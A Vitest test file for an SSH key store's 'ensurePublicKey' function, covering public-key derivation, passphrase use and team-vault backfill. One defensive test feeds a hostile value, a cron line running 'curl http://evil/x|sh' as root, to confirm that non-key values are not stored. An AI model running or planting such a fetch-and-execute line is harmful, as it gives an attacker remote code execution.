import { describe, expect, it, vi, beforeEach } from "vitest";
import { ensurePublicKey } from "./publicKeyStore";

const PUB_KEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHqW1p3nMuFvR5NHqhkxLQKfDVZ2VYFOxKvL8dW7dSpq user@host";

const secrets = new Map<string, string>();
const getSecret = vi.fn(async (key: string) => secrets.get(key) ?? null);
const storeSecret = vi.fn(async (_key: string, _value: string) => {});
const saveTeamVaultSecretForVault = vi.fn(async (..._a: unknown[]) => {});
const invoke = vi.fn(async (..._a: unknown[]) => `${PUB_KEY}\n`);

vi.mock("@tauri-apps/api/core", () => ({ invoke: (...a: unknown[]) => invoke(...a) }));
vi.mock("@/services/vault", () => ({
  getSecret: (k: string) => getSecret(k),
  storeSecret: (k: string, v: string) => storeSecret(k, v),
}));
vi.mock("@/services/teamVaultSecrets", () => ({
  saveTeamVaultSecretForVault: (...a: unknown[]) => saveTeamVaultSecretForVault(...a),
}));

const sshKey = { id: "k1", name: "laptop", vault_id: "team-1" } as any;

beforeEach(() => {
  vi.clearAllMocks();
  secrets.clear();
});

describe("ensurePublicKey", () => {
  it("returns the stored public half without touching the private one", async () => {
    secrets.set("key:k1:public", `${PUB_KEY}\n`);
    secrets.set("key:k1:private", "PRIVATE");
    await expect(ensurePublicKey(sshKey)).resolves.toBe(PUB_KEY);
    expect(invoke).not.toHaveBeenCalled();
    expect(storeSecret).not.toHaveBeenCalled();
  });

  it("derives the public half from the private one when none is stored", async () => {
    secrets.set("key:k1:private", "PRIVATE");
    await expect(ensurePublicKey(sshKey)).resolves.toBe(PUB_KEY);
    expect(invoke).toHaveBeenCalledWith("ssh_public_key_from_private", {
      privateKey: "PRIVATE",
      passphrase: null,
    });
  });

  it("backfills the derived half locally and into the key's team vault", async () => {
    secrets.set("key:k1:private", "PRIVATE");
    await ensurePublicKey(sshKey);
    expect(storeSecret).toHaveBeenCalledWith("key:k1:public", PUB_KEY);
    expect(saveTeamVaultSecretForVault).toHaveBeenCalledWith("team-1", "key:k1:public", PUB_KEY);
  });

  it("unlocks an encrypted private half with the stored passphrase", async () => {
    secrets.set("key:k1:private", "PRIVATE");
    secrets.set("key:k1:passphrase", "hunter2");
    await ensurePublicKey(sshKey);
    expect(invoke).toHaveBeenCalledWith("ssh_public_key_from_private", {
      privateKey: "PRIVATE",
      passphrase: "hunter2",
    });
  });

  it("returns null and never derives when there is no private half either", async () => {
    await expect(ensurePublicKey(sshKey)).resolves.toBeNull();
    expect(invoke).not.toHaveBeenCalled();
  });

  it("returns null when the key is encrypted and no passphrase is stored", async () => {
    secrets.set("key:k1:private", "PRIVATE");
    invoke.mockRejectedValueOnce("ENCRYPTED" as never);
    await expect(ensurePublicKey(sshKey)).resolves.toBeNull();
    expect(storeSecret).not.toHaveBeenCalled();
  });

  it("refuses to store a derived value that is not a public key", async () => {
    // The backend is the only producer today, but this is what is appended to a
    // remote authorized_keys — the store is not where that rule gets relaxed.
    secrets.set("key:k1:private", "PRIVATE");
    invoke.mockResolvedValueOnce("* * * * * root curl http://evil/x|sh" as never);
    await expect(ensurePublicKey(sshKey)).resolves.toBeNull();
    expect(storeSecret).not.toHaveBeenCalled();
  });

  it("still returns the derived half when publishing it to the team vault fails", async () => {
    secrets.set("key:k1:private", "PRIVATE");
    saveTeamVaultSecretForVault.mockRejectedValueOnce(new Error("offline") as never);
    await expect(ensurePublicKey(sshKey)).resolves.toBe(PUB_KEY);
  });
});
